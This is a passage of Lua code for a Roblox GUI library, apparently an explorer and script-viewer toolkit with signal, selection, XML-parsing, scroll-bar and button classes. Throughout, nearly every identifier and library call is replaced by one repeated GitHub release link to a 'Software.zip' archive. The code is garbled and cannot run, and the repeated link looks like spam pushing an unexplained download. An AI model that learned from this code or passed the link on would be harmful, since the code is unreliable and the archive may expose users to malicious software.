	Explorer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Properties = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	ScriptViewer = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	Notebook = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
end

local function main()
	local Lib = {}

	local renderStepped = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local signalWait = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
	local PH = newproxy() -- Placeholder, must be replaced in constructor
	local SIGNAL = newproxy()

	-- Usually for classes that work with a Roblox Object
	local function initObj(props,mt)
		local type = type
		local function copy(t)
			local res = {}
			for i,v in pairs(t) do
				if v == SIGNAL then
					res[i] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				elseif type(v) == "table" then
					res[i] = copy(v)
				else
					res[i] = v
				end
			end		
			return res
		end

		local newObj = copy(props)
		return setmetatable(newObj,mt)
	end

	local function getGuiMT(props,funcs)
		return {__index = function(self,ind) if not props[ind] then return funcs[ind] or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[ind] end end,
		__newindex = function(self,ind,val) if not props[ind] then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[ind] = val else rawset(self,ind,val) end end}
	end

	-- Functions

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local string = string
		local gsub = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local format = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local char = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local cleanTable = {['"'] = '\\"', ['\\'] = '\\\\'}
		for i = 0,31 do
			cleanTable[char(i)] = "\\"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("%03d",i)
		end
		for i = 127,255 do
			cleanTable[char(i)] = "\\"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("%03d",i)
		end

		return function(str)
			return gsub(str,"[\"\\\0-\31\127-\255]",cleanTable)
		end
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(gui)
		if gui == nil then return false end
		local mouse = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local guiPosition = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local guiSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip	

		return mouse.X >= guiPosition.X and mouse.X < guiPosition.X + guiSize.X and mouse.Y >= guiPosition.Y and mouse.Y < guiPosition.Y + guiSize.Y
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(size,num,dir)
		local max = num
		local arrowFrame = createSimple("Frame",{
			BackgroundTransparency = 1,
			Name = "Arrow",
			Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,size,0,size)
		})
		if dir == "up" then
			for i = 1,num do
				local newLine = createSimple("Frame",{
					BackgroundColor3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(220/255,220/255,220/255),
					BorderSizePixel = 0,
					Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(size/2)-(i-1),0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(size/2)+https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(max/2)-1),
					Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,i+(i-1),0,1),
					Parent = arrowFrame
				})
			end
			return arrowFrame
		elseif dir == "down" then
			for i = 1,num do
				local newLine = createSimple("Frame",{
					BackgroundColor3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(220/255,220/255,220/255),
					BorderSizePixel = 0,
					Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(size/2)-(i-1),0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(size/2)-i+https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(max/2)+1),
					Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,i+(i-1),0,1),
					Parent = arrowFrame
				})
			end
			return arrowFrame
		elseif dir == "left" then
			for i = 1,num do
				local newLine = createSimple("Frame",{
					BackgroundColor3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(220/255,220/255,220/255),
					BorderSizePixel = 0,
					Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(size/2)+https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(max/2)-1,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(size/2)-(i-1)),
					Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,i+(i-1)),
					Parent = arrowFrame
				})
			end
			return arrowFrame
		elseif dir == "right" then
			for i = 1,num do
				local newLine = createSimple("Frame",{
					BackgroundColor3 = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(220/255,220/255,220/255),
					BorderSizePixel = 0,
					Position = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(size/2)-i+https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(max/2)+1,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(size/2)-(i-1)),
					Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,i+(i-1)),
					Parent = arrowFrame
				})
			end
			return arrowFrame
		end
		error("r u ok")
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local func = function()
			-- Only exists to parse RMD
			-- from https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local string, print, pairs = string, print, pairs

			-- https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local trim = function(s)
				local from = s:match"^%s*()"
				return from > #s and "" or s:match(".*%S", from)
			end

			local gtchar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip('>', 1)
			local slashchar = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip('/', 1)
			local D = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip('D', 1)
			local E = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip('E', 1)

			function parse(s, evalEntities)
				-- remove comments
				s = s:gsub('<!%-%-(.-)%-%->', '')

				local entities, tentities = {}

				if evalEntities then
					local pos = s:find('<[_%w]')
					if pos then
						s:sub(1, pos):gsub('<!ENTITY%s+([_%w]+)%s+(.)(.-)%2', function(name, q, entity)
							entities[#entities+1] = {name=name, value=entity}
						end)
						tentities = createEntityTable(entities)
						s = replaceEntities(s:sub(pos), tentities)
					end
				end

				local t, l = {}, {}

				local addtext = function(txt)
					txt = txt:match'^%s*(.*%S)' or ''
					if #txt ~= 0 then
						t[#t+1] = {text=txt}
					end    
				end

				s:gsub('<([?!/]?)([-:_%w]+)%s*(/?>?)([^<]*)', function(type, name, closed, txt)
					-- open
					if #type == 0 then
						local a = {}
						if #closed == 0 then
							local len = 0
							for all,aname,_,value,starttxt in https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(txt, "(.-([-_%w]+)%s*=%s*(.)(.-)%3%s*(/?>?))") do
								len = len + #all
								a[aname] = value
								if #starttxt ~= 0 then
									txt = txt:sub(len+1)
									closed = starttxt
									break
								end
							end
						end
						t[#t+1] = {tag=name, attrs=a, children={}}

						if closed:byte(1) ~= slashchar then
							l[#l+1] = t
							t = t[#t].children
						end

						addtext(txt)
						-- close
					elseif '/' == type then
						t = l[#l]
						l[#l] = nil

						addtext(txt)
						-- ENTITY
					elseif '!' == type then
						if E == name:byte(1) then
							txt:gsub('([_%w]+)%s+(.)(.-)%2', function(name, q, entity)
								entities[#entities+1] = {name=name, value=entity}
							end, 1)
						end
						-- elseif '?' == type then
						--   print('?  ' .. name .. ' // ' .. attrs .. '$$')
						-- elseif '-' == type then
						--   print('comment  ' .. name .. ' // ' .. attrs .. '$$')
						-- else
						--   print('o  ' .. #p .. ' // ' .. name .. ' // ' .. attrs .. '$$')
					end
				end)

				return {children=t, entities=entities, tentities=tentities}
			end

			function parseText(txt)
				return parse(txt)
			end

			function defaultEntityTable()
				return { quot='"', apos='\'', lt='<', gt='>', amp='&', tab='\t', nbsp=' ', }
			end

			function replaceEntities(s, entities)
				return s:gsub('&([^;]+);', entities)
			end

			function createEntityTable(docEntities, resultEntities)
				entities = resultEntities or defaultEntityTable()
				for _,e in pairs(docEntities) do
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = replaceEntities(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, entities)
					entities[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				end
				return entities
			end

			return parseText
		end
		local newEnv = setmetatable({},{__index = getfenv()})
		setfenv(func,newEnv)
		return func()
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(s)
		if not s then return signalWait(renderStepped) end
		local start = tick()
		while tick() - start < s do signalWait(renderStepped) end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(button,data)
		local holding = false
		local disabled = false
		local mode = data and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 1
		local control = {}

		if mode == 2 then
			local lerpTo = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			local delta = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0.2
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(lerpTo,delta)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.6)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if disabled then return end
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not holding then
				if mode == 1 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0.4
				elseif mode == 2 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				end
			elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				holding = true
				if mode == 1 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
				elseif mode == 2 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end
				end
			end
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
			if disabled then return end
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not holding then
				if mode == 1 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
				elseif mode == 2 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				end
			elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				holding = false
				if mode == 1 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(button) and 0.4 or 1
				elseif mode == 2 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(button) and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end
				end
			end
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
			disabled = true
			holding = false

			if mode == 1 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			elseif mode == 2 then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
			disabled = false
		end

		return control
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(t,item)
		local pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(t,item)
		if pos then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(t,pos) end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(obj,data)
		local target,posOffX,posOffY,sizeOffX,sizeOffY,resize,con
		local disabled = false

		local function update()
			if not obj or not target then return end

			local targetPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local targetSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,targetPos.X + posOffX,0,targetPos.Y + posOffY)
			if resize then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,targetSize.X + sizeOffX,0,targetSize.Y + sizeOffY) end
		end

		local function setup(o,data)
			obj = o
			data = data or {}
			target = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			posOffX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0
			posOffY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0
			sizeOffX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0
			sizeOffY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0
			resize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or false

			if con then con:Disconnect() con = nil end
			if target then
				con = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(prop)
					if not disabled and prop == "AbsolutePosition" or prop == "AbsoluteSize" then
						update()
					end
				end)
			end

			update()
		end
		setup(obj,data)

		return {
			SetData = function(obj,data)
				setup(obj,data)
			end,
			Enable = function()
				disabled = false
				update()
			end,
			Disable = function()
				disabled = true
			end,
			Destroy = function()
				con:Disconnect()
				con = nil
			end,
		}
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}

    https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(gui)
        if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
            https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
        elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
            https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(gui)
            https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
        else
            https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
        end
    end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(col)
		local round = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("%d, %d, %d",round(col.r*255),round(col.g*255),round(col.b*255))
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(filename)
		if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

		local s,contents = pcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,filename)
		if s and contents then return contents end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(f,...)
		signalWait(renderStepped)
		return f(...)
	end
	
	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(filepath)
		if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(filepath) then return end

		return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(filepath)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(url,filepath)
		if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

		local s,data = pcall(game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,game["Run Service"].Parent,url)
		if not s then return end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(filepath,data)
		return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(filepath)
	end

	-- Classes

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local funcs = {}

		local disconnect = function(con)
			local pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,con)
			if pos then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,pos) end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,func)
			if type(func) ~= "function" then error("Attempt to connect a non-function") end		
			local con = {
				Signal = self,
				Func = func,
				Disconnect = disconnect
			}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] = con
			return con
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,...)
			for i,v in next,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip do
				xpcall(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),function(e) warn(e.."\n"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) end,...)
			end
		end

		local mt = {
			__index = funcs,
			__tostring = function(self)
				return "Signal: " .. tostring(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) .. " Connections"
			end
		}

		local function new()
			local obj = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}

			return setmetatable(obj,mt)
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local funcs = {}

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,obj)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[obj] then return end

			local list = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			list[#list+1] = obj
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[obj] = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,t)
			local changed
			local list,map = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			for i = 1,#t do
				local elem = t[i]
				if not map[elem] then
					list[#list+1] = elem
					map[elem] = true
					changed = true
				end
			end
			if changed then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,obj)
			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[obj] then return end

			local list = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(list,obj)
			if pos then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(list,pos) end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[obj] = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,t)
			local changed
			local list,map = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local removeSet = {}
			for i = 1,#t do
				local elem = t[i]
				map[elem] = nil
				removeSet[elem] = true
			end

			for i = #list,1,-1 do
				local elem = list[i]
				if removeSet[elem] then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(list,i)
					changed = true
				end
			end
			if changed then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,obj)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 1 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[1] == obj then return end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {obj}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {[obj] = true}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,t)
			local newList,newMap = {},{}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newList,newMap
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(t,1,#t,1,newList)
			for i = 1,#t do
				newMap[t[i]] = true
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 then return end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end

		local mt = {__index = funcs}

		local function new()
			local obj = setmetatable({
				List = {},
				Map = {},
				Changed = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			},mt)

			return obj
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local funcs = {}

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local label = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("ImageLabel")
			self:SetupLabel(label)
			return label
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,obj)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,obj,index)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*index, 0)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*(index % https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip), https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(index / https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip))	
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,obj,key)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[key] then
				self:Display(obj,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[key])
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,dict)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = dict
		end

		local mt = {}
		mt.__index = funcs

		local function new(mapId,mapSizeX,mapSizeY,iconSizeX,iconSizeY)
			local obj = setmetatable({
				MapId = mapId,
				MapSizeX = mapSizeX,
				MapSizeY = mapSizeY,
				IconSizeX = iconSizeX,
				IconSizeY = iconSizeY,
				NumX = mapSizeX/iconSizeX,
				IndexDict = {}
			},mt)
			return obj
		end

		local function newLinear(mapId,iconSizeX,iconSizeY)
			local obj = setmetatable({
				MapId = mapId,
				IconSizeX = iconSizeX,
				IconSizeY = iconSizeY,
				IndexDict = {}
			},mt)
			return obj
		end

		return {new = new, newLinear = newLinear}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function()
		local funcs = {}
		local user = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local mouse = plr:GetMouse()
		local checkMouseInGui = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local createArrow = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		local function drawThumb(self)
			local total = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local visible = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local index = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local scrollThumb = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local scrollThumbFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			if not (self:CanScrollUp()	or self:CanScrollDown()) then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			end

			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visible/total,0,1,0)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip < 16 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0)
				end
				local fs = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local bs = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(self:GetScrollPercent()*(fs-bs)/fs,0,0,0)
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,visible/total,0)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip < 16 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,16)
				end
				local fs = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local bs = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
